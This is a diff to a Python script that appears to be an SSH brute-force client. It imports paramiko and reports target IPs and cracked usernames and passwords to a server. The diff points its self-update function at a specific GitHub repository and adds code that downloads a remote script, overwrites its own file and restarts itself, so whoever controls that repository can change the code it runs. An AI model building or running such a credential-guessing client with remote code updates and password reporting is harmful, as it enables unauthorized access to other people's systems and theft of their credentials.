@@ -5,12 +5,14 @@ import paramiko
 import requests
 import base64
 import threading
+import subprocess
+import sys
 
 # Function to fetch updates from GitHub if available
 def update_script_from_github():
     try:
         response = requests.get(
-            "https://api.github.com/repos/YOUR_USERNAME/YOUR_REPO/contents/brute_force.py")
+            "https://api.github.com/repos/botsarefuture/ukrainetowin/contents/client.py")
         response.raise_for_status()
         remote_content = response.json()["content"]
         remote_content = base64.b64decode(remote_content).decode("utf-8")
@@ -22,8 +24,16 @@ def update_script_from_github():
             with open(__file__, "w") as f:
                 f.write(remote_content)
             print("Updated the script from GitHub.")
+            
+            # Restart the script with the updated version
+            args = [sys.executable] + sys.argv
+            subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            sys.exit()
     except Exception as e:
         print("Error fetching updates from GitHub:", e)
+        
+    
+
 
 
 def send_result_to_server(target_ip, success, username="", password=""):
